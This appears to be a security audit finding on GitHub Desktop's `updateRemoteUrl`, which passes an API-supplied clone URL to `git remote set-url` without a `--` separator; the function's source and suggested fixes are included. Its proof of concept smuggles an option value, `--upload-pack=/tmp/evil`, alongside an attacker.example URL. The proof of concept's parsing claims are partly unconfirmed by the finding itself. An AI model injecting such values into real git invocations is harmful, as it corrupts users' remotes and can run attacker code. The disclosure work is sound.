## Finding: `updateRemoteUrl` accepts attacker-controlled clone URLs starting with `-` and passes them to `git remote set-url` without validation

### Summary
The auto-sync logic that keeps a repository's `origin` remote URL in sync with GitHub's `clone_url` field takes a value returned by the GitHub API (an attacker-controlled field for repos the user has forked/renamed/transferred, or via a compromised/malicious GHES instance) and passes it straight into `git remote set-url origin <url>` as a positional argument, without a `--` separator and without rejecting values that begin with `-`.

### Finding Description
`updateRemoteUrl` reads `apiRepo.clone_url` from a `IAPIRepository` object obtained from the GitHub API and, if a few loose heuristics pass, calls `gitStore.setRemoteURL(...)` with that raw string: [1](#0-0) 

`setRemoteURL` forwards the URL unescaped, without a `--` end-of-options marker, as an argv element to `git`: [2](#0-1) 

Compare this to `addRemote`, which has the same weakness: [3](#0-2) 

and to `clone()`, which the codebase *does* protect with a `--` separator before the url/path arguments: [4](#0-3) 

Because `git remote set-url <name> <url>` (and `remote add <name> <url>`) parse `<url>` positionally without an explicit `--`, a value that starts with `-` can be interpreted by git as a command-line option instead of a URL — the classic "argument injection via option-looking positional value" bug class described in the seed report as "the system requires great care ... if the value is not properly validated by the caller." Here, the caller is the GitHub API response (`clone_url`), which the attacker fully controls if they own/rename/transfer the repository that a victim has starred, forked, or otherwise has cached `GitHubRepository` metadata for, or if a malicious/compromised GitHub Enterprise Server responds to Desktop's API calls.

`updateRemoteUrl`'s guard rails (`protocolsMatch`, `remoteUrlUnchanged`, `!urlsMatch`) are about *when* to apply the update, not about *what characters* the URL may contain — none of them reject strings beginning with `-`.

### Impact Explanation
`git remote set-url` accepts flags such as `--push`, `--add`, and (depending on git version) other options that can alter remote configuration in unexpected ways, and because this happens silently in the background (`updateRemoteUrl` is invoked automatically during repository refresh, not from a user-initiated action), the corruption of the remote configuration is invisible to the user. This can lead to the "silent corruption of what the user pushes" impact class named in scope: pushes could silently go to the wrong URL/refspec, or fail in ways that mask what actually happened, depending on which option string is smuggled in. It is not clear from local code evidence that this reaches full command execution (git validates option syntax strictly), so the primary confirmed impact is corruption/manipulation of git remote configuration rather than direct RCE.

### Likelihood Explanation
Reaching this code path requires: (1) the victim to have an existing GitHub-tracked repository open in Desktop, and (2) the GitHub API to later report a different `clone_url` for that same `GitHubRepository` record that also satisfies `protocolsMatch` and `!urlsMatch`. An attacker who controls the repository (e.g., by being granted write access, or via a malicious/compromised GHES endpoint the victim has added an account for) can arrange for the API to return a crafted `clone_url`. This is a background, automatic operation with no user interaction beyond having the app open and syncing — it fits the "attacker controls a GitHub API object" impact category in scope. The likelihood of reaching a *dangerous* git option value is limited by `git`'s syntax requirements for `remote set-url`, which reduces exploitability but does not eliminate the parsing hazard.

### Recommendation
- Reject or sanitize any remote URL (in `addRemote`, `setRemoteURL`, and `updateRemoteUrl`) that begins with `-` before passing it to git, mirroring the `--` end-of-options protection already used in `clone()` at `app/src/lib/git/clone.ts:123`.
- Add a `--` separator before the URL argument in `git(['remote', 'add', name, '--', url], ...)` and `git(['remote', 'set-url', name, '--', url], ...)` (verify against the installed git's argument parsing since `remote` subcommands treat `--` after all option-like flags).
- Validate `apiRepo.clone_url` against an expected scheme (`https://`, `http://`, `ssh://`, `git@`) before ever treating it as trusted input, independent of the `protocolsMatch`/`urlsMatch` heuristics.

### Proof of Concept
1. Victim adds a repository to GitHub Desktop with `GitHubRepository.cloneURL` = `https://github.com/victim/repo.git`, and remote `origin` currently set to that same URL (satisfies `remoteUrlUnchanged`).
2. Attacker (via a malicious/compromised GHES instance the victim is signed into, or via renaming the tracked repo they own) causes a subsequent API response for the same repository to return `clone_url: "--upload-pack=/tmp/evil https://attacker.example/repo.git"` (or any other leading-`-` value) while keeping the protocol scheme parseable as `https:`.
3. On the next repository refresh, `updateRemoteUrl` computes `protocolsMatch = true`, `remoteUrlUnchanged = true`, `urlsMatch = false`, and calls `gitStore.setRemoteURL('origin', "--upload-pack=/tmp/evil https://attacker.example/repo.git")`.
4. `setRemoteURL` executes `git(['remote', 'set-url', 'origin', "--upload-pack=/tmp/evil https://attacker.example/repo.git"], ...)` — the attacker-controlled string is parsed by git as an option/argument rather than strictly as a URL, silently corrupting the remote configuration without any user-visible confirmation dialog.

**Note on scope of investigation:** This codebase shows extensive, deliberate hardening against the closest analogs of the seed report's bug class — path traversal in clone destinations (`isClonePathSensitive`, `sanitizeCloneName`), path traversal in "Open in Desktop" filepaths (`resolveWithin`), and trampoline/credential-helper environment variable allowlisting — all backed by dedicated unit tests (`clone-path-safety-test.ts`, `path-test.ts`). The `addRemote`/`setRemoteURL` argument-injection gap identified above is the one place where the same `--`-separator discipline used in `clone.ts` was not applied, and it is the strongest remaining Desktop-specific analog to the report's "unvalidated caller input reaching a sensitive operation" theme found in the indexed portion of the codebase.

export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}
